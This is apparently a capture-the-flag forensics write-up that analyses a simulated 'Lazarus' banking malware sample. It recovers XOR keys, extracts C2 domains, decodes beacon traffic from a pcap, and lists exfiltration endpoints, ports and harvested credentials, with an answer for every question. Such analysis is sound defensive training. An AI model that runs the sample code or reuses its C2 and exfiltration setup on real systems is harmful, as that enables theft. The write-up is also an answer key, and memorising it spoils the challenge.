# LAZARUS GROUP BANKING HEIST 

## Question 1: XOR Key Recovery Through Cryptanalysis
The malware uses XOR encryption throughout. Recover the encryption key by analyzing the keylogger's known plaintext patterns and the encrypted backdoor.

```bash
xxd malware/persistence.py | head -20

python3 -c '
encrypted = open("malware/persistence.py", "rb").read()
known_start = b"#!/usr/bin/env python3"
potential_key = bytearray()
for i in range(min(len(known_start), len(encrypted))):
    potential_key.append(encrypted[i] ^ known_start[i])
print("Key discovered:", potential_key.decode())
'

Key discovered: L4z4ru5Gr0up2024K3y
```
Answer:     

---

## Question 2: PE Configuration Extraction
Extract the malware configuration from the PE binary using the discovered XOR key. Identify all C2 infrastructure and attack parameters.

Answer Format: C2_PRIMARY_C2_BACKUP_CAMPAIGN_ID

```bash
┌──(hidden㉿Ultra)-[~/…/IEEECTF/DFIR/malware/LAZARUS_HEIST]
└─$ python3 -c '
with open("malware/lazarus_loader.exe", "rb") as f:
    data = f.read()
key = b"L4z4ru5Gr0up2024K3y"
for offset in range(512, 800, 10):
    test_chunk = data[offset:offset+200]
    if len(test_chunk) < 50:
        continue
    decrypted = bytearray()
    for i in range(len(test_chunk)):
        decrypted.append(test_chunk[i] ^ key[i % len(key)])
    
    decrypted_str = decrypted.decode("utf-8", errors="ignore")
    if "C2_PRIMARY" in decrypted_str or "LAZARUS_CONFIG" in decrypted_str:
        print(f"Config at offset {offset}:")
        print(decrypted_str)
        break
'
xxd -l 512 -s 512 malware/lazarus_loader.exe


Config at offset 512:
LAZARUS_PAYLOAD_START
[LAZARUS_CONFIG]
C2_PRIMARY=update.microsoft-security.org:8443
C2_BACKUP=cdn.adobe-updates.net:8443
ENCRYPTION_KEY=L4z4ru5Gr0up2024K3y
CAMPAIGN_ID=SWIFT_HEIST_2024
TARGET_PROCES
00000200: 0075 2075 2020 6618 2271 2c3c 7d71 766b  .u u  f."q,<}qvk
00000210: 1867 381e 607a 3e29 3974 1d33 6220 236d  .g8.`z>)9t.3b #m
00000220: 737d 7a0d 7a3e 113e 3906 2d25 670e 3f71  s}z.z>.>9.-%g.?q
00000230: 2729 0f45 4250 2a47 1c62 5913 5700 1a46  ').EBP*G.bY.W..F

```
Answer: update.microsoft-security.org:8443_cdn.adobe-updates.net:8443_SWIFT_HEIST_2024

---

## Question 3: SWIFT Transaction Forensics
Analyze the keylogger data to reconstruct complete SWIFT transaction timeline and calculate total financial exposure.

Answer Format: TOTAL_FRAUD_AMOUNT_USD_SWIFT_OPERATOR_PASSWORD


```bash
┌──(hidden㉿Ultra)-[~/…/IEEECTF/DFIR/malware/LAZARUS_HEIST]
└─$ python3 -c '
exec(open("malware/banking_keylogger.py").read())
keylogger = LazarusBankingKeylogger()
keylogger.simulate_banking_activity()
swift_transactions = keylogger.capture_swift_messages()
credentials = keylogger.harvest_banking_credentials()

total_amount = sum(float(tx["amount"]) for tx in swift_transactions)
swift_cred = next(c for c in credentials if "SWIFT" in c["system"])
print("Total: " + str(int(total_amount)))
print("Password: " + swift_cred["password"])
'
Total: $96000000
Password: Sw1ft$ecur3!

```

Answer: 96000000_Sw1ft$ecur3!

---

## Question 4: Network Protocol Analysis and C2 Communication Decoding
Analyze complete C2 communication protocol and decode beacon payloads.

Answer Format: C2_HOST_SESSION_ID_FORMAT


```bash
                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/IEEECTF/DFIR/malware/LAZARUS_HEIST]
└─$ tshark -r pcaps/lazarus_attack.pcap -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e urlencoded-form.value

python3 -c '
import base64
beacon_data = "eyJzZXNzaW9uX2lkIjoiTEFaQVJVUy0xMjM0NSIsImhvc3RuYW1lIjoiQkFOSy1XT1JLU1RBVElPTi0wMSJ9"
decoded = base64.b64decode(beacon_data)
print("Beacon:", decoded.decode())
'

tshark -r pcaps/lazarus_attack.pcap -Y "tcp.dstport == 8443" -T fields -e tcp.payload | while read payload; do
    echo $payload | xxd -r -p | strings
done


update.microsoft-security.org   /api/v1/beacon  LAZARUS-12345,BANK-WORKSTATION-01,SWIFT_HEIST_2024
update.microsoft-security.org   /api/v1/beacon  LAZARUS-12346,BANK-WORKSTATION-01,SWIFT_HEIST_2024
update.microsoft-security.org   /api/v1/beacon  LAZARUS-12347,BANK-WORKSTATION-01,SWIFT_HEIST_2024
update.microsoft-security.org   /api/v1/beacon  LAZARUS-12348,BANK-WORKSTATION-01,SWIFT_HEIST_2024
update.microsoft-security.org   /api/v1/beacon  LAZARUS-12349,BANK-WORKSTATION-01,SWIFT_HEIST_2024
update.microsoft-security.org   /api/v1/beacon  LAZARUS-12350,BANK-WORKSTATION-01,SWIFT_HEIST_2024
update.microsoft-security.org   /api/v1/beacon  LAZARUS-12351,BANK-WORKSTATION-01,SWIFT_HEIST_2024
update.microsoft-security.org   /api/v1/beacon  LAZARUS-12352,BANK-WORKSTATION-01,SWIFT_HEIST_2024
172.30.1.200    /api/keylog
172.30.1.200    /api/keylog
172.30.1.200    /api/keylog
172.30.1.200    /api/keylog
172.30.1.200    /api/keylog
172.30.1.200    /api/exfiltration
172.30.1.200    /api/exfiltration
172.30.1.200    /api/exfiltration
172.30.1.200    /api/exfiltration
Beacon: {"session_id":"LAZARUS-12345","hostname":"BANK-WORKSTATION-01"}
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
session_id=LAZARUS-12345&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
session_id=LAZARUS-12346&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
session_id=LAZARUS-12347&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
session_id=LAZARUS-12348&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
session_id=LAZARUS-12349&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
session_id=LAZARUS-12350&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
session_id=LAZARUS-12351&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
session_id=LAZARUS-12352&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024

```

Answer: update.microsoft-security.org_LAZARUS-12345_BANK-WORKSTATION-01

---

## Question 5: Cryptocurrency Mining Infrastructure Analysis
Extract complete cryptocurrency mining configuration and correlate wallet address with known Lazarus operations.

Answer Format: WALLET_ADDRESS_FIRST_20_CHARS


```bash
                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/IEEECTF/DFIR/malware/LAZARUS_HEIST]
└─$ python3 -c '
with open("malware/lazarus_loader.exe", "rb") as f:
    data = f.read()

key = b"L4z4ru5Gr0up2024K3y"
for offset in range(512, 800, 10):
    test_chunk = data[offset:offset+1000]
    if len(test_chunk) < 50:
        continue
    decrypted = bytearray()
    for i in range(len(test_chunk)):
        decrypted.append(test_chunk[i] ^ key[i % len(key)])
    
    decrypted_str = decrypted.decode("utf-8", errors="ignore")
    if "WALLET_ADDR" in decrypted_str:
        import re
        wallet_matches = re.findall(r"4[A-Za-z0-9]{94}", decrypted_str)
        if wallet_matches:
            print("Wallet:", wallet_matches[0][:20])
            break
'
Wallet: 4A7Bb2kHh9Ca8Y4BjP3t

```

Answer: 4A7Bb2kHh9Ca8Y4BjP3t

---

## Question 6: Multi-Vector Data Exfiltration Analysis
Reconstruct all data exfiltration channels and identify exfiltrated content types.
Answer Format: HTTP_PORT_CHUNK_COUNT


```bash
┌──(hidden㉿Ultra)-[~/…/IEEECTF/DFIR/malware/LAZARUS_HEIST]
└─$ tshark -r pcaps/lazarus_attack.pcap -Y "tcp.dstport == 8080" -T fields -e tcp.dstport | head -1

python3 -c '
with open("pcaps/lazarus_attack.pcap", "rb") as f:
    pcap_data = f.read()

chunk_count = pcap_data.count(b"EXFIL_CHUNK_")
print("Chunks:", chunk_count)
'
8080
Chunks: 4


```

Answer: 8080_4

---

## Question 7: Banking Credential Compromise Assessment
Determine complete scope of credential compromise and calculate potential financial exposure.
Answer Format: TOTAL_SYSTEMS:ADMIN_ACCOUNTS:DB_ADMIN_HASH_FIRST_16


```bash
┌──(hidden㉿Ultra)-[~/…/IEEECTF/DFIR/malware/LAZARUS_HEIST]
└─$ python3 -c '
exec(open("malware/banking_keylogger.py").read())
keylogger = LazarusBankingKeylogger()
credentials = keylogger.harvest_banking_credentials()

total_systems = len(credentials)
admin_accounts = sum(1 for cred in credentials if "ADMIN" in cred["access_level"])
db_admin = next(c for c in credentials if "db_admin" in c["username"])

print("Systems:", total_systems)
print("Admin accounts:", admin_accounts)
print("DB hash:", db_admin["password_hash"][:16])
'
Systems: 4
Admin accounts: 2
DB hash: e99a18c428cb38d5
                            
```

Answer: 4:2:e99a18c428cb38d5

---

## Question 8: Attack Timeline Reconstruction
Build complete timeline of attack phases by correlating network traffic with malware execution stages.

Answer Format: KEYLOGGER_PORT_MINING_PORT_BACKDOOR_PORT


```bash
┌──(hidden㉿Ultra)-[~/…/IEEECTF/DFIR/malware/LAZARUS_HEIST]
└─$ tshark -r pcaps/lazarus_attack.pcap -T fields -e tcp.dstport | sort | uniq

3333
4444
8080
8443
9999


```
Answer: 9999_3333_4444

---

## Question 9: Advanced Persistence and Anti-Forensics Analysis
Analyze malware persistence mechanisms and anti-forensics capabilities.

Answer Format: Capabilities_Sessionprefix


```bash
┌──(hidden㉿Ultra)-[~/…/IEEECTF/DFIR/malware/LAZARUS_HEIST]
└─$ python3 -c '
key = b"L4z4ru5Gr0up2024K3y"
with open("malware/persistence.py", "rb") as f:
    encrypted = f.read()

decrypted = bytearray()
for i in range(len(encrypted)):
    decrypted.append(encrypted[i] ^ key[i % len(key)])

code = decrypted.decode("utf-8", errors="ignore")

import re
capabilities = re.findall(r"capabilities.*?\[(.*?)\]", code)
session_prefix = re.findall(r"session_id.*?=.*?\"([A-Z_]+)_", code)
hostname = re.findall(r"hostname.*?=.*?\"([A-Z-]+)\"", code)

if capabilities:
    cap_count = len(capabilities[0].split(","))
    print("Capabilities:", cap_count)
if session_prefix:
    print("Session prefix:", session_prefix[0])
if hostname:
    print("Hostname:", hostname[0])
'
Capabilities: 4
Session prefix: LAZARUS_PERSIST

```
Answer: 4_LAZARUS_PERSIST


---

## Question 10: Attribution and Infrastructure Correlation
Correlate discovered infrastructure with known Lazarus Group operations and identify attribution evidence.

Answer Format: TYPOSQUAT_DOMAIN_CAMPAIGN_ID_SWIFT_TARGETS


```bash
python3 -c '
infrastructure = {
    "domains": ["update.microsoft-security.org", "cdn.adobe-updates.net"],
    "ips": ["172.30.1.200"],
    "wallets": [],
    "campaigns": []
}

with open("malware/lazarus_loader.exe", "rb") as f:
    content = f.read().decode("utf-8", errors="ignore")
    
import re
wallet_matches = re.findall(r"4[A-Za-z0-9]{94}", content)
campaign_matches = re.findall(r"CAMPAIGN.*?=.*?([A-Z_0-9]+)", content)

infrastructure["wallets"] = wallet_matches
infrastructure["campaigns"] = campaign_matches

print("C2 Domains:", infrastructure["domains"])
print("Wallet Addresses:", infrastructure["wallets"])
print("Campaign IDs:", infrastructure["campaigns"])

typosquatting = [d for d in infrastructure["domains"] if "microsoft" in d and "microsoft.com" not in d]
print("Typosquatting domains:", typosquatting)

print("LAZARUS GROUP INDICATORS:")
print("- Typosquatted Microsoft domains")
print("- Monero cryptocurrency mining")  
print("- SWIFT banking system targeting")
print("- Multi-stage XOR encryption")
'

grep -i "north.korea\|dprk\|pyongyang\|lazarus" malware/*


C2 Domains: ['update.microsoft-security.org', 'cdn.adobe-updates.net']
Wallet Addresses: []
Campaign IDs: []
Typosquatting domains: ['update.microsoft-security.org']
LAZARUS GROUP INDICATORS:
- Typosquatted Microsoft domains
- Monero cryptocurrency mining
- SWIFT banking system targeting
- Multi-stage XOR encryption
malware/banking_keylogger.py:class LazarusBankingKeylogger:
malware/banking_keylogger.py:                "beneficiary_name": "LAZARUS FRONT COMPANY LIMITED",
malware/banking_keylogger.py:            "operation": "LAZARUS_SWIFT_HEIST_FINAL_EXFIL",
malware/banking_keylogger.py:            "BENEFICIARY:", "Space", "LAZARUS", "Space", "FRONT", "Space", "COMPANY", "Tab",
malware/banking_keylogger.py:    keylogger = LazarusBankingKeylogger()
malware/file_analysis.txt:LAZARUS_HEIST/malware/banking_keylogger.py: Python script, ASCII text executable
malware/file_analysis.txt:LAZARUS_HEIST/malware/file_hashes.txt:      ASCII text
malware/file_analysis.txt:LAZARUS_HEIST/malware/lazarus_loader.exe:   MS-DOS executable, MZ for MS-DOS
malware/file_analysis.txt:LAZARUS_HEIST/malware/persistence.py:       data
malware/file_hashes.txt:LAZARUS GROUP MALWARE ANALYSIS - FILE HASHES
malware/file_hashes.txt:File: lazarus_loader.exe
grep: malware/__pycache__: Is a directory

```

Answer: update.microsoft-security.org_LAZARUS_SWIFT_HEIST_FINAL_EXFIL_LAZARUS_FRONT_COMPANY_LIMITED